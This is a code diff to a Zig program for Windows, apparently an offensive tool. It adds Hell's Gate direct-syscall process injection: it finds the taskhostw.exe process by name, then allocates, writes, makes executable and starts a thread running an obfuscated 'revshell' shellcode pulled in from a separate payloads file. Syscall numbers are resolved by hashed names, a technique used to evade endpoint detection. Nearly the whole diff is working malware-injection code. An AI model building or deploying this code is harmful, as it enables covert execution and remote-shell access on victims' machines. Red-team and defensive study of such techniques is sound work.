@@ -1,7 +1,11 @@
 const std = @import("std");
+const payloads = @import("payloads.zig");
 const print = std.debug.print;
 const windows = std.os.windows;
 const WINAPI = windows.WINAPI;
+
+// const target_process = "RuntimeBroker.exe";
+const target_process = "taskhostw.exe";
 
 // Windows types and constants
 pub const HANDLE = windows.HANDLE;
@@ -26,12 +30,9 @@ pub const PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE;
 pub const THREAD_ALL_ACCESS = 0x1FFFFF;
 pub const PROCESS_ALL_ACCESS = 0x001FFFFF;
 pub const FALSE = windows.FALSE;
-
-// Syscall hashes (djb2)
-// const NtAllocateVirtualMemory_djb2: u64 = 0x7B2D1D431C81F5F6;
-// const NtWriteVirtualMemory_djb2: u64 = 0x54AEE238645CCA7C;
-// const NtProtectVirtualMemory_djb2: u64 = 0xA0DCC2851566E832;
-// const NtCreateThreadEx_djb2: u64 = 0x2786FB7E75145F1A;
+const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
+const INVALID_HANDLE_VALUE: HANDLE = @as(HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));
+const MAX_PATH: usize = 260;
 
 // Syscall hashes (djb2)
 const NtAllocateVirtualMemory_djb2: u64 = 0x2D6D94ABE5CBF5F6;
@@ -41,64 +42,31 @@ const NtCreateThreadEx_djb2: u64 = 0xD6BC9C637D9E5F1A;
 
 // Global assembly - Hell's Gate implementation
 // Zig only support AT&T syntax due to LLVM for now
+// -----------------------------------------------
+// Zig will export those function to be call at compile time
 comptime {
-    if (@import("builtin").target.cpu.arch == .x86_64) {
-        asm (
-            \\.data
-            \\w_system_call: .long 0
-            \\
-            \\.text
-            \\.globl _hells_gate
-            \\_hells_gate:
-            \\    movl $0, w_system_call(%rip)
-            \\    movl %ecx, w_system_call(%rip)
-            \\    ret
-            \\
-            \\.globl _hells_descent
-            \\_hells_descent:
-            \\    mov %rcx, %r10
-            \\    movl w_system_call(%rip), %eax
-            \\    syscall
-            \\    ret
-        );
-    } else {
-        asm (
-            \\ .section .data
-            \\ limbo_callback:
-            \\     .long 0
-            \\ 
-            \\ limbo_syscall:
-            \\     .long 0
-            \\ 
-            \\ .section .text
-            \\ .code32
-            \\ 
-            \\ .globl _limbo_hell
-            \\ _limbo_hell:
-            \\     movl %ecx, limbo_callback
-            \\     ret
-            \\ 
-            \\ .globl _hells_gate
-            \\ _hells_gate:
-            \\     movl %ecx, limbo_syscall
-            \\     ret
-            \\ 
-            \\ .globl _hells_descent
-            \\ _hells_descent:
-            \\     movl limbo_syscall, %eax
-            \\     movl limbo_callback, %edx
-            \\     call *%edx
-            \\     ret
-        );
-    }
+    asm (
+        \\.data
+        \\w_system_call: .long 0
+        \\
+        \\.text
+        \\.globl hells_gate
+        \\hells_gate:
+        \\    movl $0, w_system_call(%rip)
+        \\    movl %ecx, w_system_call(%rip)
+        \\    ret
+        \\
+        \\.globl hells_descent
+        \\hells_descent:
+        \\    mov %rcx, %r10
+        \\    movl w_system_call(%rip), %eax
+        \\    syscall
+        \\    ret
+    );
 }
 
 const HellsGateFn = fn (syscall_id: u32) callconv(.C) void;
 const HellDescentFn = fn () callconv(.C) void;
-
-// pub fn hells_gate(syscall_number: DWORD) void {
-//     const code =
-// }
 
 // External function declarations for the global assembly
 pub extern fn hells_gate(syscall_number: DWORD) void;
@@ -161,17 +129,14 @@ const ImageDataDirectory = extern struct {
 
 // IMAGE_OPTIONAL_HEADER64 in Windows
 const ImageOptionalHeader64 = extern struct {
-    Magic: WORD,
     MajorLinkerVersion: BYTE,
     MinorLinkerVersion: BYTE,
     SizeOfCode: DWORD,
     SizeOfInitializedData: DWORD,
-    SizeOfUninitializedData: DWORD,
     AddressOfEntryPoint: DWORD,
     BaseOfCode: DWORD,
     ImageBase: u64,
     SectionAlignment: DWORD,
-    FileAlignment: DWORD,
     MajorOperatingSystemVersion: WORD,
     MinorOperatingSystemVersion: WORD,
     MajorImageVersion: WORD,
@@ -216,7 +181,6 @@ const ImageExportDirectory = extern struct {
 };
 
 // TEB and PEB structures (simplified)
-// LIST_ENTRY in Windows
 const ListEntry = extern struct {
     Flink: *ListEntry,
     Blink: *ListEntry,
@@ -320,6 +284,20 @@ const TEB = extern struct {
     // ... rest omitted for brevity
 };
 
+// PROCESSENTRY32W structure
+const PROCESSENTRY32W = extern struct {
+    dwSize: DWORD,
+    cntUsage: DWORD,
+    th32ProcessID: DWORD,
+    th32DefaultHeapID: usize, // ULONG_PTR
+    th32ModuleID: DWORD,
+    cntThreads: DWORD,
+    th32ParentProcessID: DWORD,
+    pcPriClassBase: i32, // LONG
+    dwFlags: DWORD,
+    szExeFile: [MAX_PATH]u16, // WCHAR[MAX_PATH]
+};
+
 // External functions
 extern "kernel32" fn GetCurrentThreadId() callconv(WINAPI) DWORD;
 extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;
@@ -327,6 +305,72 @@ extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
 extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;
 extern "kernel32" fn GetCurrentProcess() callconv(WINAPI) HANDLE;
 extern "kernel32" fn GetThreadId(Thread: HANDLE) callconv(WINAPI) DWORD;
+extern "kernel32" fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) callconv(WINAPI) HANDLE;
+extern "kernel32" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;
+extern "kernel32" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;
+
+// Helper function to convert UTF-8 string to UTF-16 (wide string)
+fn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![]u16 {
+    const utf16_len = try std.unicode.calcUtf16LeLen(utf8_str);
+    var wide_string = try allocator.alloc(u16, utf16_len + 1);
+
+    _ = try std.unicode.utf8ToUtf16Le(wide_string[0..utf16_len], utf8_str);
+    wide_string[utf16_len] = 0; // Null terminate
+
+    return wide_string;
+}
+
+// Helper function to compare wide strings (case-insensitive)
+fn compareWideStringsIgnoreCase(str1: []const u16, str2: []const u16) bool {
+    if (str1.len != str2.len) return false;
+
+    for (str1, str2) |c1, c2| {
+        // Simple case-insensitive comparison for ASCII range
+        const lower_c1 = if (c1 >= 'A' and c1 <= 'Z') c1 + 32 else c1;
+        const lower_c2 = if (c2 >= 'A' and c2 <= 'Z') c2 + 32 else c2;
+        if (lower_c1 != lower_c2) return false;
+    }
+    return true;
+}
+
+fn getRemoteProcessPid(allocator: std.mem.Allocator, process_name: []const u8) !DWORD {
+    const wide_process_name = try convertToWideString(allocator, process_name);
+    defer allocator.free(wide_process_name);
+
+    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        return error.SnapshotFailed;
+    }
+    defer _ = CloseHandle(snapshot);
+
+    var process_entry = std.mem.zeroes(PROCESSENTRY32W);
+    process_entry.dwSize = @sizeOf(PROCESSENTRY32W);
+
+    if (Process32FirstW(snapshot, &process_entry) == 0) {
+        return error.ProcessEnumFailed;
+    }
+
+    while (true) {
+        // Find the length of the executable name (null-terminated)
+        var exe_name_len: usize = 0;
+        while (exe_name_len < process_entry.szExeFile.len and process_entry.szExeFile[exe_name_len] != 0) {
+            exe_name_len += 1;
+        }
+
+        const exe_name = process_entry.szExeFile[0..exe_name_len];
+
+        // Compare process names (case-insensitive)
+        if (compareWideStringsIgnoreCase(exe_name, wide_process_name[0 .. wide_process_name.len - 1])) { // -1 to exclude null terminator
+            return process_entry.th32ProcessID;
+        }
+
+        if (Process32NextW(snapshot, &process_entry) == 0) {
+            break;
+        }
+    }
+
+    return error.ProcessNotFound;
+}
 
 fn rtlGetThreadEnvironmentBlock() *TEB {
     // x86_64
@@ -564,6 +608,68 @@ pub fn hellsGateInject(vx_table: *VX_TABLE, processHandle: HANDLE, payload: [*]c
     return true;
 }
 
+fn classicInjectionViaSyscalls(vx_table: *VX_TABLE, process_handle: HANDLE, payload: [*]const u8, payload_size: SIZE_T) bool {
+    const nt_success = NTSTATUS.SUCCESS;
+    var status: NTSTATUS = nt_success;
+    var address: ?PVOID = @ptrFromInt(0);
+    var old_protection: ULONG = 0;
+    var size: SIZE_T = payload_size;
+    var bytes_written: SIZE_T = 0;
+    var thread_handle: HANDLE = undefined;
+
+    // Step 1: Allocate memory using Hell's Gate
+    hells_gate(vx_table.NtAllocateVirtualMemory.system_call);
+    status = hells_descent(@intFromPtr(process_handle), @intFromPtr(&address), 0, @intFromPtr(&size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0, 0, 0, 0, 0);
+
+    if (status != nt_success) {
+        print("[!] NtAllocateVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
+        return false;
+    }
+    print("[+] Allocated Address At : 0x{X} Of Size : {d}\n", .{ @intFromPtr(address), size });
+
+    // Step 2: Write the payload
+    print("\t[i] Writing Payload Of Size {d} ... ", .{payload_size});
+    hells_gate(vx_table.NtWriteVirtualMemory.system_call);
+    status = hells_descent(@intFromPtr(process_handle), @intFromPtr(address), @intFromPtr(payload), payload_size, @intFromPtr(&bytes_written), 0, 0, 0, 0, 0, 0);
+
+    if (status != nt_success or bytes_written != payload_size) {
+        print("[!] NtWriteVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
+        print("[i] Bytes Written : {d} of {d}\n", .{ bytes_written, payload_size });
+        return false;
+    }
+    print("[+] DONE\n", .{});
+
+    // Step 3: Change memory protection to executable
+    hells_gate(vx_table.NtProtectVirtualMemory.system_call);
+    status = hells_descent(@intFromPtr(process_handle), @intFromPtr(&address), @intFromPtr(&payload_size), PAGE_EXECUTE_READWRITE, @intFromPtr(&old_protection), 0, 0, 0, 0, 0, 0);
+
+    if (status != nt_success) {
+        print("[!] NtProtectVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
+        return false;
+    }
+
+    // Step 4: Execute the payload via thread
+    print("\t[i] Running Thread Of Entry 0x{X} ... ", .{@intFromPtr(address)});
+    hells_gate(vx_table.NtCreateThreadEx.system_call);
+    status = hells_descent(@intFromPtr(&thread_handle), THREAD_ALL_ACCESS, 0, // NULL object attributes
+        @intFromPtr(process_handle), @intFromPtr(address), 0, // NULL parameter
+        0, // Create flags
+        0, // Stack zero bits
+        0, // Size of stack commit
+        0, // Size of stack reserve
+        0 // Bytes buffer
+    );
+
+    if (status != nt_success) {
+        print("[!] NtCreateThreadEx Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
+        return false;
+    }
+    print("[+] DONE\n", .{});
+    print("\t[+] Thread Created With Id : {d}\n", .{GetThreadId(thread_handle)});
+
+    return true;
+}
+
 /// Check if Hell's Gate technique is available on current system
 pub fn isAvailable() bool {
     const currentTeb = rtlGetThreadEnvironmentBlock();
@@ -571,54 +677,48 @@ pub fn isAvailable() bool {
     return currentPeb.OSMajorVersion == 0xA;
 }
 
-pub fn init() !void {
-    if (@import("builtin").target.cpu.arch == .x86_64) {
-        asm volatile (
-            \\.data
-            \\w_system_call: .long 0
-            \\
-            \\.text
-            \\.globl _hells_gate
-            \\_hells_gate:
-            \\    movl $0, w_system_call(%rip)
-            \\    movl %ecx, w_system_call(%rip)
-            \\    ret
-            \\
-            \\.globl _hells_descent
-            \\_hells_descent:
-            \\    mov %rcx, %r10
-            \\    movl w_system_call(%rip), %eax
-            \\    syscall
-            \\    ret
-        );
+pub fn main() !void {
+    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    const shellcode = try payloads.macDeobfuscation(&payloads.revshell, allocator);
+    defer allocator.free(shellcode);
+
+    print("[*] hell's gate process injection\n", .{});
+
+    // Check if Hell's Gate is available
+    if (!isAvailable()) {
+        print("[-] Hell's Gate technique not available (requires Windows 10)\n", .{});
+        std.process.exit(1);
+    }
+
+    // Initialize VX table
+    var vx_table = init_vx_table() orelse {
+        print("[-] Failed to initialize Hell's Gate VX table\n", .{});
+        std.process.exit(1);
+    };
+
+    print("\n[*] VX Table initialized successfully\n", .{});
+    print("[*] Payload size: {d} bytes\n", .{shellcode.len});
+    var success = false;
+
+    const target_pid = try getRemoteProcessPid(allocator, target_process);
+
+    print("[i] Targeting process of id : {d}\n", .{target_pid});
+    const target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid) orelse {
+        print("[!] OpenProcess Failed With Error : {d}\n", .{GetLastError()});
+        std.process.exit(1);
+    };
+    defer _ = CloseHandle(target_process_handle);
+
+    print("[*] Performing REMOTE injection\n", .{});
+    success = classicInjectionViaSyscalls(&vx_table, target_process_handle, shellcode.ptr, shellcode.len);
+
+    if (success) {
+        print("\n[+] Injection completed successfully!\n", .{});
     } else {
-        asm volatile (
-            \\ .section .data
-            \\ limbo_callback:
-            \\     .long 0
-            \\ 
-            \\ limbo_syscall:
-            \\     .long 0
-            \\ 
-            \\ .section .text
-            \\ .code32
-            \\ 
-            \\ .globl _limbo_hell
-            \\ _limbo_hell:
-            \\     movl %ecx, limbo_callback
-            \\     ret
-            \\ 
-            \\ .globl _hells_gate
-            \\ _hells_gate:
-            \\     movl %ecx, limbo_syscall
-            \\     ret
-            \\ 
-            \\ .globl _hells_descent
-            \\ _hells_descent:
-            \\     movl limbo_syscall, %eax
-            \\     movl limbo_callback, %edx
-            \\     call *%edx
-            \\     ret
-        );
+        print("\n[-] Injection failed!\n", .{});
+        std.process.exit(1);
     }
 }
